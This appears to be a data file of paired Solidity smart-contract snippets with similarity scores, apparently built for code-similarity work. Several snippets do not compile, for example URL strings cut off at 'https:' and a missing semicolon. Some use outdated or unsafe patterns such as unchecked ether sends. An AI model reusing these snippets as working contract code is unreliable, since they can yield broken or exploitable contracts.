    function addressToString(address _addr) public pure returns(string memory) 
    {
        bytes32 value = bytes32(uint256(_addr));
        bytes memory alphabet = ""0123456789abcdef"";

        bytes memory str = new bytes(51);
        str[0] = '0';
        str[1] = 'x';
        for (uint256 i = 0; i < 20; i++) {
            str[2+i*2] = alphabet[uint8(value[i + 12] >> 4)];
            str[3+i*2] = alphabet[uint8(value[i + 12] & 0x0f)];
        }
        return string(str);
    }
}",0.6144842582092946,"contract ERC223 {

  function name() public view returns (string);

  function symbol() public view returns (string);

  function decimals() public view returns (uint8);



  function transfer(address to, uint256 value, bytes data) public returns (bool);

  function transferFrom(address from, address to, uint256 value, bytes data) public returns (bool);



  event Transfer(address indexed from, address indexed to, uint256 value, bytes data);

}"
"contract B is A{
    ...
    can't change A.V
    ...
}",0.6153160236006955,"contract A {

    B public myB = new B();

}"
"contract Test
{

mapping (address => Account) public Accounts;

struct Account {
    address id;
    string company;
    string country;
    string industry;
    bool active;
}


modifier validAccount(address _accountId) {
    require (Accounts[msg.sender].active);
    _;
}

function Add(address _id, string _company, string _country, string _industry,bool _active)
{
    Account memory  acc = Account(_id,_company,_country,_industry,_active);
    Accounts[_id] = acc;
}

function GetCompany(address _id) onlyValid(_id) public constant returns(string)
{
    return Accounts[_id].company;
}

modifier onlyValid(address _id)
{
    require (Accounts[_id].active);
    _;
}

modifier onlyValidSender()
{
    require(Accounts[msg.sender].active);
    _;
}

function GetCountry(address _id) onlyValidSender public view returns(string)
{
        return Accounts[_id].company;

}

}",0.6020362246586446,"contract Checkable {
    address private serviceAccount;
    
    bool private triggered = false;

    
    event Triggered(uint balance);
    
    event Checked(bool isAccident);

    constructor() public {
        serviceAccount = msg.sender;
    }

    
    function changeServiceAccount(address _account) public onlyService {
        require(_account != 0);
        serviceAccount = _account;
    }

    
    function isServiceAccount() public view returns (bool) {
        return msg.sender == serviceAccount;
    }

    
    function check() public payable onlyService notTriggered {
        if (internalCheck()) {
            emit Triggered(address(this).balance);
            triggered = true;
            internalAction();
        }
    }

    
    function internalCheck() internal returns (bool);

    
    function internalAction() internal;

    modifier onlyService {
        require(msg.sender == serviceAccount);
        _;
    }

    modifier notTriggered {
        require(!triggered);
        _;
    }
}"
"contract Test {
mapping (address => uint) content2view;
 address[] contents;
 

 function getStatistics() external view returns (address[], uint[]){
    address[] memory resAddr;
    uint[] memory views;
    for(uint i = 0; i<contents.length; i++){
        resAddr[i] = contents[i];
        views[i] = content2view[contents[i]];
    }
    return (resAddr, views);
}
}",0.6253366889314157,"contract GetTokenBalances {

    

    function getTenTokenBalance(ERC20 token, uint numHolders, address[] calldata holders) external view returns (uint[] memory) {

        

        uint [] memory resBalances = new uint[](numHolders);

        

        for (uint i = 0; i < numHolders; i++) {

            resBalances[i] = token.balanceOf(holders[i]);

        }

        

        return resBalances;

    }

    

}"
"contract NullifyArray {

    address[] public status;

    function pushArray(address data)
        public
        returns(uint arrayLength)
    {
        return status.push(data);
    }

    function getArrayLength() 
        public 
        constant
        returns (uint arrayLength)
    {
        return status.length;
    }

    function nullifyArray()
        public
        returns(uint arrayLength)
    {
        status.length=0;
        return status.length;
    }

}",0.6508677037815668,"contract GetTest{

    uint a = 1;

    string b = ""b"";

    address c;

    constructor() public {

        c = msg.sender;

    }

    function getOne() public constant returns(uint) {

        return a;

    }

    function getTwo() public constant returns(uint, string){

        return (a, b);

    }

    function getThree() public constant returns (uint, string, address){

        return (a, b, c);

    }

}"
"contract example{
    uint lastcount; 
    struct fileDetail{ 
        string name;
        uint price;
    }

    mapping (uint => address[]) fileOwner; 
    mapping (uint => fileDetail) fileDetails; 
    uint[] saveId; 

    function getFileDetails(uint id) view public returns(string memory, uint){ 
        fileDetail storage up = fileDetails[id]; 
        return(up.name, up.price); 
    }

    function getAllSavedID() view public returns(uint[] memory){ 
        return saveId; 
    }

    function getOwners(uint id) view public returns(address[] memory){ 
        return fileOwner[id]; 
    }

    function getOwnersSize(uint id) view public returns(uint){ 
        return fileOwner[id].length; 
    }

    function createAsset(string memory name, uint price) public{
        uint id = now + lastcount;  

        fileDetail storage up = fileDetails[id]; 
        up.name = name; 
        up.price = price; 

        saveId.push(id) -1; 

        fileOwner[id].push(msg.sender); 

        lastcount = lastcount + 1; 
    }

    function addNewOwner(uint id) public{
        uint size = getOwnersSize(id); 
        fileOwner[id].push(msg.sender)+size; 
    }
}",0.620452074746562,"contract FoundationToken {

    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 1000;

    mapping (address => uint) internal _balanceOf;

    mapping (address => mapping (address => uint)) internal _allowances;

    

    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = totalSupply;

    }

    

    function name() public view returns (string) {

        return _name;

    }

    

    function symbol() public view returns (string) {

        return _symbol;

    }

    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    

    function totalSupply() public view returns (uint) {

        return _totalSupply;

    }

    

    function balanceOf(address _addr) public view returns (uint);



    

    

    

    

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
contract Main is Component {},0.6624505997546811,contract TongCoin is ERC20{}
"contract Ballot {
 uint public  key = 0x123A1; 

}",0.6743425696887609,"contract Empty {
 uint public value = 5;
}"
"contract firstCoin{

address deployer; 
mapping(address=>uint) balances;  

constructor() public {
    deployer = msg.sender;  
}



function giveCoin(uint amount,address receiver) public
{
  if(msg.sender == deployer){

    balances[receiver] += amount;

  }
  else{
    revert(); 
  }
}

function viewBalance() public view returns (uint)
{
  return balances[msg.sender];
}
}",0.6470366201927078,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external payable {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract shapeCalculator {
    function rectangle(uint w,uint h) constant
    returns (uint s, uint p ){
    s=w*h;
    p=2*(w+h);
    }
}",0.6451486221035,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract timeLock
{
    struct accountData
    {
        uint balance;
        uint releaseTime;
    }

    mapping (address => accountData) accounts;

    function payIn(uint lockTimeS) public payable
    {
        uint amount = msg.value;
        payOut();
        if (accounts[msg.sender].balance > 0)
            msg.sender.send(msg.value);
        else
        {
            accounts[msg.sender].balance = amount;
            accounts[msg.sender].releaseTime = now + lockTimeS;
        }
    }

    function payOut() public
    {
        if (accounts[msg.sender].balance != 0 && accounts[msg.sender].releaseTime < now)
        {
            msg.sender.send(accounts[msg.sender].balance);
            accounts[msg.sender].balance = 0;
            accounts[msg.sender].releaseTime = 0;
        }
    }

    function getMyLockedFunds() public view returns (uint x)
    {
        return accounts[msg.sender].balance;
    }

    function getMyLockedFundsReleaseTime() public view returns (uint x)
    {
        return accounts[msg.sender].releaseTime;
    }

    function getNow() public view returns (uint x)
    {
        return now;
    }
}",0.6075604522349692,"contract ChristmasClub is Ownable {
    using SafeMath for uint256;
    
    uint public withdrawalTime = 1543622400; 
    uint public earlyWithdrawalFeePct = 10;
    
    uint public totalDeposited = 0;
    
    mapping (address => uint) balances;
    
    function setWithdrawalTime (uint newTime) public onlyOwner {
        withdrawalTime = newTime;
    }
    
    function deposit () public payable {
        totalDeposited = totalDeposited.add(msg.value);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }
    
    function withdraw () public {
        uint toWithdraw = balances[msg.sender];
        if (now < withdrawalTime) {
            toWithdraw = toWithdraw.mul(100 - earlyWithdrawalFeePct).div(100);
            balances[owner] = balances[owner].add(balances[msg.sender] - toWithdraw);
        }
        balances[msg.sender] = 0;
        msg.sender.transfer(toWithdraw);
    }
    
    function getBalance () public view returns (uint) {
        return balances[msg.sender];
    }
    
    function () public payable {
    }
}"
"contract ChainlinkExample is ChainlinkClient {
  
  uint256 public currentPrice;
  address public owner;

  constructor() public {
    
    setPublicChainlinkToken();
    owner = msg.sender;
  }

  
  function requestEthereumPrice(address _oracle, bytes32 _jobId, uint256 _payment) 
    public
    onlyOwner
  {
    
    Chainlink.Request memory req = buildChainlinkRequest(_jobId, address(this), this.fulfill.selector);
    
    req.add(""get"", ""https:
    
    req.add(""path"", ""USD"");
    
    req.addInt(""times"", 100);
    
    sendChainlinkRequestTo(_oracle, req, _payment);
  }

  
  function fulfill(bytes32 _requestId, uint256 _price)
    public
    
    recordChainlinkFulfillment(_requestId)
  {
    currentPrice = _price;
  }
  
  
  function cancelRequest(
    bytes32 _requestId,
    uint256 _payment,
    bytes4 _callbackFunctionId,
    uint256 _expiration
  )
    public
    onlyOwner
  {
    cancelChainlinkRequest(_requestId, _payment, _callbackFunctionId, _expiration);
  }

  
  
  function withdrawLink()
    public
    onlyOwner
  {
    LinkTokenInterface link = LinkTokenInterface(chainlinkTokenAddress());
    require(link.transfer(msg.sender, link.balanceOf(address(this))), ""Unable to transfer"");
  }
  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}",0.6147752065304435,"contract Gemini is ChainLink {
    bytes32 constant UINT256_MUL_JOB = bytes32(""f291f8597d174f4aa1983b0e27ae160f""); 
    
    bytes32 constant UINT256_MUL_JOB__LINK = bytes32(""513907f96955437a8ac02a5d70e5bdea""); 
    

    constructor(MedianizerInterface med_, ERC20 link_, address oracle_)
        public
        ChainLink(med_, link_, oracle_)
    {}

    function getAssetPrice(uint128 payment) internal returns (bytes32 queryId) {
        Chainlink.Request memory req = buildChainlinkRequest(UINT256_MUL_JOB, this, this.returnAssetPrice.selector);
        req.add(""get"", ""https:
        req.add(""path"", ""last"");
        req.addInt(""times"", 1000000000000000000);
        queryId = sendChainlinkRequest(req, div(payment, 2));
    }

    function getPaymentTokenPrice(uint128 payment, bytes32 queryId) internal returns (bytes32) {
        Chainlink.Request memory req = buildChainlinkRequest(UINT256_MUL_JOB__LINK, this, this.returnPaymentTokenPrice.selector);
        req.add(""endpoint"", ""price"");
        req.add(""fsym"", ""LINK"");
        req.add(""tsyms"", ""USD"");
        req.add(""copyPath"", ""USD"");
        req.addInt(""times"", 1000000000000000000);
        bytes32 linkId = sendChainlinkRequest(req, div(payment, 2));
        linkIdToQueryId[linkId] = queryId;
        return linkId;
    }
}"
"contract TestToken is StandardToken
{
    uint256 public tokensPerEther = 1000;

    constructor() public
    {
        totalSupply_ = 10000;
        balances[this] = totalSupply_;
    }

    function() payable external
    {
        this.transfer(msg.sender, msg.value * tokensPerEther);
    }
}",0.6803458157881035,"contract PrivateMoneyCoin is Token{

    

    constructor() public{

        symbol = ""PMC"";

        name = ""PrivateMoneyCoin"";

        decimals = 8;

        totalSupply = 1371519100000000;

        owner = msg.sender;

        balances[owner] = totalSupply;

    }

    

    function () payable external {

        revert();

    }

}"
"contract test {
    uint average;
    uint counter;

    function calcAverage( uint _newValue) public
    {
        average = ((average * counter) + _newValue)/(counter + 1);
        counter++;
    }

    function get() public view returns(uint)
    {
        return average;
    }
}",0.6772083452833746,"contract Smartcontract_counter {

    int private count = 0;

    function incrementCounter() public {

        count += 1;

    }

    function decrementCounter()public {

        count -= 1;

    }

    function getCount() public view returns (int) {

        return count;

    }

}"
"contract c{

    function send(){

    }}",0.6923358533535657,"contract Eater{
	function(){
		
	}
}"
"contract StateTest
{
    uint public u;
    bool public  b;
    int  public  i;
    string public  s;
    byte   public  by;
    bytes  public  bs;
    address public  a;

    function StateTest()
    {
        u=1;
        b=true;
        i=-1;
        s=""abc"";
        by = 0x13;

        bs=new bytes(2);
        bs[0]=0x11;
        bs[1]=0xff;

        a = msg.sender;
    }
}",0.6003179248197644,"contract YFT is StandardToken {
    string  public name = ""Yi Fa Temple Token"";
    string  public symbol = ""YFT"";
    uint8   public decimals = 18;
    uint    public totalSupply = 10 ** 26;
    function ()
        payable
        public
    {
        revert();
    }
    function YFT() public {
        balances[msg.sender] = totalSupply;
    }
}"
"contract Test {
    uint public num;
    constructor(uint256 _num) public {
        num = _num;
    }
}",0.6501218824636759,"contract Token {

	uint8 public decimals;



  	constructor () public {

		decimals = 24;

  	}

}"
"contract Names {

 string[] names;

 function setname(uint i, string s)public returns(bool){

     names[i]=s;
     return true;
 }
}",0.6415623274028012,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract getData {
    uint b;
    function getAfrom () public view returns (uint){
        SaveData sd = SaveData(0x8c1eD7e19abAa9f23c476dA86Dc1577F1Ef401f5); 
        return sd.getA();
    }
}",0.6209562855571893,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract sample{
    uint number;

    constructor(uint _number)public{
        number = _number;
    }


    function getNumber() view public returns(uint256){
        return number;
    }
}",0.6531240792414187,"contract Coin {

    function getOwner(uint index) public view returns (address, uint256);

    function getOwnerCount() public view returns (uint);

}"
"contract Token {
    string public greeting;
    mapping (address => uint) public balances;
    constructor() public {
            greeting = 'Hello';
            balances[msg.sender] = 33333;
    }
}",0.6071671472900485,"contract owned {

    address public owner;

    address public manager;



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

}"
"contract Demo {
    struct SimpleStruct {
        uint256 a;
        uint256 b;
        address c;
    }

    function returnsSimpleStruct() public view returns (SimpleStruct){
        return SimpleStruct(0, 0, address(0));
    }

}",0.6424025369172698,"contract GemLike4 {
    function decimals() public view returns (uint);
    function balanceOf(address) public returns (uint256);
    function transfer(address, uint256) public returns (bool);
}"
"contract HelloWorld
{
string hello = ""Hello World"";
function sayHello() public view returns (string memory)
{
    return hello;
}
}",0.6206171715847093,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract B {

     A instance = new A();

     function wrapper_someMethod() public{
          instance.someMethod(msg.sender);
     }
}",0.6254895791240613,"contract B {

    function newA() public returns(address) {

        A newInstance = new A();

        return address(newInstance);

    }

}"
"contract Forwarder {
  address public destination;
  constructor() public {
    destination = msg.sender;
  }

  function() payable public {
    destination.transfer(msg.value);
  }
}",0.6983922956837054,"contract Halfer{
    address owner; 
    constructor() public {
        owner = msg.sender;
    }
    
    function() public payable{
        owner.transfer(msg.value/2);
        msg.sender.transfer(address(this).balance);
    }
}"
"contract A{
    bool public checkvalue;
function transferFrom(uint256 value)
    private 
    returns(bool){
    
    
        if (value == 2) return true;
        else return false;
    }
    function check()public{
        
        checkvalue = transferFrom(2);
    }
}",0.6987811898739983,"contract Token {
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function transfer(address _to, uint256 _value) public returns (bool success);
}"
"contract Test is DebugEvents
{
    function Test() public payable
    {
    }

    function fooDevel(uint i)
    requireDebugModifier(i<10, ""I must be less then 10"")
    public
    returns (uint)
    {
        return i;
    }


    function fooProduction(uint i)
    requireModifier(i<10)
    public
    returns (uint)
    {
        return i;
    }

}",0.6400893094423685,"contract IDSToken {

    function mint(address dst, uint wad) public;

    function burn(address dst, uint wad) public;

    function transfer(address dst, uint wad) public returns (bool);

    function transferFrom(address src, address dst, uint wad) public returns (bool);

}"
"contract TestLibrary{
    using IntExtended for uint;

    function testIncrement(uint _base) returns (uint){
        return _base.increment();
    }
}",0.6243335431864178,"contract Agent {
    using SafeMath for uint256;

    function isInitialized() public constant returns (bool) {
        return false;
    }
}"
"contract Tx {
    address public p1;
    address public p2;
    Own public o1;
    Own public o2;

    function createContract(){
        
    }


    function Tx(address ownAddress){
        p1 = msg.sender;
        o1 = Own(ownAddress);
    }
    function participate(address ownAddress){
        p2 = msg.sender;
        o2 = Own(ownAddress);
        o1.transfer(p2,{from:p1});
        o2.transfer(p1,{from:p2});
    }
}",0.6566682504387061,"contract Ownable {

  address public owner;

  address private myAddress = this;



  

  function Ownable() public {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

  

    

    function() payable public {

    }



  

  function transferOwnership(address newOwner) public onlyOwner {

    require(newOwner != address(0));

    owner = newOwner;

    

  }



}"
"contract ForcedForward {

    struct DepositStruct {
        address sender;
        uint amount;
        uint blockNumber;
        uint deadline;
    }

    mapping(address => DepositStruct[]) spenderDepositStructs;

    event LogReceived (address spender, uint depositNumber, uint amount, uint deadline, address sender);
    event LogForwarded(address spender, uint depositNumber, uint amount, address recipient);
    event LogWithdrawn(address spender, uint depositNumber, uint amount, address sender);

    
    
    
    

    function deposit(address spender, uint deadline)
        public
        payable
        returns(bool success)
    {
        if(deadline <= block.number) throw; 
        if(msg.value==0) throw; 
        DepositStruct memory d;
        d.sender = msg.sender;
        d.amount = msg.value;
        d.deadline = deadline;
        spenderDepositStructs[spender].push(d);
        LogReceived(spender, spenderDepositStructs[spender].length-1, msg.value, deadline, msg.sender);
        return true;
    }

    
    
    

    function forward(address recipient, uint depositNumber)
        public
        returns(bool success)
    {
        DepositStruct d = spenderDepositStructs[msg.sender][depositNumber];
        if(d.deadline < block.number) throw; 
        uint amount = d.amount;
        if(amount == 0) throw; 
        spenderDepositStructs[msg.sender][depositNumber].amount = 0; 
        if(!recipient.send(d.amount)) throw;
        LogForwarded(msg.sender, depositNumber, amount, recipient);
        return true;
    }

    
    

    function withdraw(address spender, uint depositNumber)
        public
        returns(bool success)
    {
        DepositStruct d = spenderDepositStructs[spender][depositNumber];
        if(d.sender != msg.sender) throw; 
        if(d.deadline > block.number) throw; 
        uint amount = d.amount;
        spenderDepositStructs[spender][depositNumber].amount = 0; 
        if(amount==0) throw; 
        if(!msg.sender.send(amount)) throw; 
        LogWithdrawn(spender, depositNumber, amount, msg.sender);
        return true;
    }

    
    

    function getSpenderDepositCount(address spender) 
        public
        constant
        returns(uint spenderDepositCount)
    {
        return spenderDepositStructs[spender].length;
    }

    function getSpenderDeposit(address spender, uint depositNumber)
        public
        constant
        returns(address sender, uint amount, uint deadline)
    {
        DepositStruct d;
        d = spenderDepositStructs[spender][depositNumber];
        return(d.sender, d.amount, d.deadline);
    }

}",0.6069694190074808,"contract NcICO {
    using SafeMath for uint;
    uint public prices;
    
    uint public start; 
    
    uint public end; 
    
    mapping(address => uint) public balances;
    
    bool public crowdsaleEnded = false;
    
    address public tokenOwner;
    
    token public tokenReward;
    
    address wallet;
    uint public amountRaised;
    uint public deadline;
    
    
    event Finalize(address _tokenOwner, uint _amountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution, uint _amountRaised);

    
    uint _current = 0;
    function current() public returns (uint) {
        
        if(_current == 0) {
            return now;
        }
        return _current;
    }
    function setCurrent(uint __current) {
        _current = __current;
    }
    

    
    function NcICO(
        address tokenAddr, 
        address walletAddr, 
        address tokenOwnerAddr,
        uint durationInMinutes,
        uint etherCostOfEachToken
        
        
        
        ) {
        tokenReward = token(tokenAddr);
        wallet = walletAddr;
        tokenOwner = tokenOwnerAddr;
        deadline = now + durationInMinutes * 1 minutes;
        
        
        prices = etherCostOfEachToken * 0.0000001 ether;
    }

    
    function() payable {
        
        
        
        
        
        
         if (msg.sender != wallet) 
             exchange(msg.sender);
    }

    
    
    
    function exchange(address receiver) payable {
        uint amount = msg.value;
        uint price = getPrice();
        uint numTokens = amount.mul(price);

        require(numTokens > 0);
        

        wallet.transfer(amount);
        balances[receiver] = balances[receiver].add(amount);

        
        amountRaised = amountRaised.add(amount);
       

        assert(tokenReward.transferFrom(tokenOwner, receiver, numTokens));
        FundTransfer(receiver, amount, true, amountRaised);
    }

    
    
    
    function manualExchange(address receiver, uint value) {
        require(msg.sender == tokenOwner);
       
        
        assert(tokenReward.transferFrom(tokenOwner, receiver, value));
    }

    
    function getPrice() constant returns (uint price) {
        
        
        
        
       
       
       return prices;
    }

    modifier afterDeadline() { if (current() >= end) _; }

    
    function finalize() afterDeadline {
        require(!crowdsaleEnded);
        tokenReward.burn(); 
        Finalize(tokenOwner, amountRaised);
        crowdsaleEnded = true;
    }

    
    
    function safeWithdrawal() afterDeadline {
        uint amount = balances[msg.sender];
        if (address(this).balance >= amount) {
            balances[msg.sender] = 0;
            if (amount > 0) {
                msg.sender.transfer(amount);
                FundTransfer(msg.sender, amount, false, amountRaised);
            }
        }
    }
}"
"contract B {
    A a = new A();

    function getA() returns(uint){
        return a.value();
    }
}",0.6918061835152519,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract MyToken is ERC20Burnable {
    uint256 private _totalSupply = 100;

    constructor() ERC20Burnable() public {
        _mint(msg.sender, _totalSupply);
    }
}",0.608659760137829,"contract ClasseToken is ERC777 {
  constructor(uint256 cap) ERC777(""ClasseToken"", ""CAS"", new address[](0)) public {
    _mint(msg.sender, msg.sender, cap, """", """");
  }
}"
"contract TtdmToken {

  uint256 public totalSupply;

  constructor () public {
    totalSupply = 1000000;
  }
}",0.6583689088498856,"contract Token is ERC20 {
  constructor(uint256 supply) public {
    _mint(msg.sender, supply);
  }
}"
"contract A{
    function getZ() returns(uint8[2]){
        uint8[2] memory z = [255, 255];

        return z;
    }
}",0.6364725637733408,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract Test {
   uint [] public players ;
    constructor() public {
        players.push(1);
        players.push(2);
        players.push(3);
    }

    function getArray() public view returns (uint[] memory){
       return players;
    }
}",0.633026789563619,"contract test {



        uint _multiplier;



        constructor (uint multiplier) public {

             _multiplier = multiplier;

        }



        function multiply(uint a) public view returns(uint d)  

        {

             return a * _multiplier;

        }

    }"
"contract adding{

  function  add(uint256 val1,uint256 val2) public pure  returns(uint256){
    
    uint256 total = val1+val2;
    return total;
  }
}",0.6416425244061953,"contract IHumanity {

    function mint(address account, uint256 value) public;

    function totalSupply() public view returns (uint256);

}"
"contract Number {
    uint public number = 8;
}",0.6850152889506057,"contract Empty {
 uint public value = 5;
}"
"contract B is A {
    function doSomething() public{
        LOG(3);
    }
}",0.6524409236450435,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract Percentage{

    uint public testvalue;

    
    constructor(uint256 _value, uint256 percentage) public {

        
       uint transferAmount = (_value * SafeMath.sub(100, percentage)) / 100;

       
       testvalue = transferAmount;
    }   
}",0.6209202534699322,"contract Counter {

  event Incremented(uint256 value);



  uint256 public value;



  constructor() public payable

  {

    value = 0;

  }



  function increment() public payable {

    value += 1;

    emit Incremented(value);

  }

}"
"contract Crowdsale {
    ...
}",0.6486932415130529,contract Burnable {}
"contract myContract {
    string myString;

    function setStr(string memory _str) public
    {
        myString = _str;
    }

    function reverseStrMain() public view returns (string memory)
    {
        return reverseStr(myString);
    }

    function reverseStrArg(string memory strIn) public view returns (string memory)
    {
        return reverseStr(strIn);
    }

    function reverseStr(string memory strIn) internal pure returns (string memory)
    {
        bytes memory _myString = bytes(strIn);
        uint256 count = _myString.length;
        uint256 end   = count - 1;
        bytes memory reveresedStr = new bytes(count);

        for (uint256 begin = 0; begin < count; begin++)
            reveresedStr[begin] = _myString[end--];

        return string(reveresedStr);
    }

}",0.6093375539276569,"contract CloversMetadata {

    using strings for *;



    function tokenURI(uint _tokenId) public view returns (string _infoUrl) {

        string memory base = ""https:

        string memory id = uint2hexstr(_tokenId);

        string memory suffix = """";

        return base.toSlice().concat(id.toSlice()).toSlice().concat(suffix.toSlice());

    }

    function uint2hexstr(uint i) internal pure returns (string) {

        if (i == 0) return ""0"";

        uint j = i;

        uint length;

        while (j != 0) {

            length++;

            j = j >> 4;

        }

        uint mask = 15;

        bytes memory bstr = new bytes(length);

        uint k = length - 1;

        while (i != 0){

            uint curr = (i & mask);

            bstr[k--] = curr > 9 ? byte(55 + curr) : byte(48 + curr); 

            i = i >> 4;

        }

        return string(bstr);

    }

}"
"contract test {
    ERC20 token = ERC20(address); 
    ERC20 token = new ERC20(); 

    token.transferFrom(from, to, value); 
}",0.6364575286724896,"contract ERC20 {
  function transferFrom( address from, address to, uint value) returns (bool ok);
}"
"contract InsanFactory{
    struct User{
        string name;
        address myaddress;
    }
    mapping(address => User) public userStructs;
    address[] public userAddress ;

    function createUser(string memory name,address myaddress) public{
        userStructs[msg.sender].name = name;
        
        userStructs[msg.sender].myaddress = myaddress;
        
        userAddress.push(msg.sender);
    }
    function getResult() external view returns(address[] memory){
        return userAddress;
    }
}",0.6297405259366351,"contract BlockTO_9 {

    address[] addresses;

    mapping (address => bool) addressValidated;

    

    function becomeValidator() public {

        require(!isValidator(msg.sender));

        require(addresses.length < 10);

        addresses.push(msg.sender);

        addressValidated[msg.sender] = true;

    }



    function isValidator(address _who) public view returns (bool) {

        return addressValidated[_who];

    }



    function getValidators() public view returns(address[]) {

        return addresses;

    }

}"
"contract Memory {
    function addTransaction(address destination, uint value, bytes memory data)
        internal
        returns (uint transactionId)
    {
        return 0;
    }
}",0.6708231569115193,"contract Token {
    function balanceOf(address a) returns (uint) {return 0;}
    function transfer(address a, uint val) returns (bool) {return false;}
}"
"contract Testing {


function test() view returns (uint, string)
{
    return (10,""test"");



}

   string s;
   uint u;

    function f(uint a) external view{ 
   (u,s)= test();

}
}",0.6667946627426969,"contract ICERC20 is ICToken {
    function mint(uint mintAmount) external returns (uint);

    function underlying() external view returns (address token);
}"
"contract Array {
  using Lib for Lib.clusterData;
  address[] clusterAddresses;
  mapping(address => Lib.clusterData) clusterContract;

  function registerCluster(){
     clusterContract[msg.sender].constructCluster();
     clusterAddresses.push(msg.sender);
  }

 function getClusterAddresses() public view
    returns (address[])
   {
    return clusterAddresses;
   }
}",0.6212293355989498,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract Mail{
    mapping(address=>string) loginInfo;
    function validate(bytes key, bytes expectedResult) public constant returns(bool){
         
          
       return true;
    }

}",0.6572860317944531,"contract EOSContractInterface

{

    mapping (address => string) public keys;

    function balanceOf( address who ) constant returns (uint value);

}"
"contract Mycontract{

    function f(uint256 value) public pure returns (uint256){
        uint x; 
        x = value*2;
        return x;
    }

}",0.6890119466159075,"contract PureLoop
{
    function execute() public pure returns (uint output) {
        uint num;
        num +=execute();
        return num++;
    }
}"
contract Component {},0.6486932415130529,"contract CcmTest {

}"
"contract c{
    function f() constant returns(uint){
        return 1;
    }
}",0.6750412719087989,"contract AmIOnTheFork {
    function forked() constant returns(bool);
}"
"contract SimpleMultiSig {

  uint public nonce;                
  uint public threshold;            
  mapping (address => bool) isOwner; 
  address[] public ownersArr;        
",0.6179955903641668,"contract IOwnership {

    
    function isOwner(address _account) public view returns (bool);


    
    function getOwner() public view returns (address);
}"
"contract C {
    uint started;
    uint ended;

    

    function method() view returns (uint, uint)
    {
        return (started, ended)
    }
}",0.6715664652436398,"contract CToken {
    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint);
}"
"contract MyContract
{
    address[] public childContracts;

    function newContracts(uint _id,string _name) public returns(address _newContract)
    {
        uint id=_id;
        string memory name=_name;
        AnotherContract a = new AnotherContract(id,name);
        childContracts.push(a);
        return a;
    }
}",0.6940865106642944,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract AnotherContract
{
    string public name; 
    uint public id;
    constructor(uint _id,string _name) public 
    {
        name=_name;
        id=_id;
    }
}",0.6631868497703434,"contract DetailedERC20 is ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor() public {
        
    }

    
}"
"contract IWETH is ERC20 {
  event Deposit(address indexed sender, uint256 amount);
  event Withdrawal(address indexed recipient, uint256 amount);

  function deposit() public payable;

  function withdraw(uint256 amount) public;

  function withdraw(uint256 amount, address user) public;
}",0.6896875278023548,"contract ERC20OldBasic {

  function totalSupply() public view returns (uint256);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public;

  event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract TestMethod{
   string public name = ""Reverb"";

   function updateName(string _name) public{
       name = _name;
   }
}",0.6249681261097002,"contract DigitalPadlock {
    string public message;

    function DigitalPadlock(string _m) public {
        message = _m;
    }
}"
"contract TestToken is StandardToken {
    using SafeMath for uint;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public _totalSupply;


    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


    constructor() public {

        name = ""TestToken"";
        symbol = ""tttest"";
        decimals = 18;
        _totalSupply = 4000000000000000000000000000;
        balances[0xE3FdfaAF08F4778c7E88Ed1E31696745ed610328] = _totalSupply;
        emit Transfer (address(0), 0xE3FdfaAF08F4778c7E88Ed1E31696745ed610328, _totalSupply); 
    }
}",0.658787517723712,"contract CDS is FreezeToken {
  string public name;  
  string public symbol; 
  uint8 public decimals;
  mapping (address => string) public keys;

  event Register (address user, string key);

  constructor() public {
    name = ""Commerce Digital Storm"";
    symbol = ""CDS"";
    decimals = 8;
    totalSupply_ = 500000000000000000;
    balances[msg.sender] = totalSupply_;

    emit Transfer(address(0x00), msg.sender, totalSupply_);
  }

  function register(string memory key) public {
    keys[msg.sender] = key;
    emit Register(msg.sender, key);
  }

}"
"contract string_test {

    function string_tobytes( string s) constant returns (bytes){
        bytes memory b3 = bytes(s);
        return b3;
    }
}",0.6158996016795691,"contract f {
    function a() constant returns (string b){
        return ""tickletickle vac ban in csgo march 10 2017"";
    }
}"
